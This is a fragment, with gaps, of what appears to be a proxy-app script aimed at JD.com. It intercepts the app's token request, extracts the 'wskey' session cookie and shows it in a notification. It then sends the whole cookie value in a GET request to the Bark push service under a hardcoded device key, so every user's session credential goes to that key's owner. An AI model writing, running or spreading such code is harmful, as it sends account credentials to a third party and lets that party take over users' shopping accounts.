    ...
    try {
        if ($request.url.indexOf('https://rjsb-token-m.jd.com/gettoken_c') > -1) {
            ...
            if (CV.match(/(wskey=.+?;)/)) {
                ...
                $.notify("成功获取到wskey",'',CookieValue)
                $.http.get("https://api.day.app/3rnzRCyqGvzSi8rFzSVXJj/WSK通知/"+CookieValue+"/?autoCopy=1&copy="+CookieValue+"&icon=https://cdn.jsdelivr.net/gh/braless/site_logo/jd_app.png")
            } else {
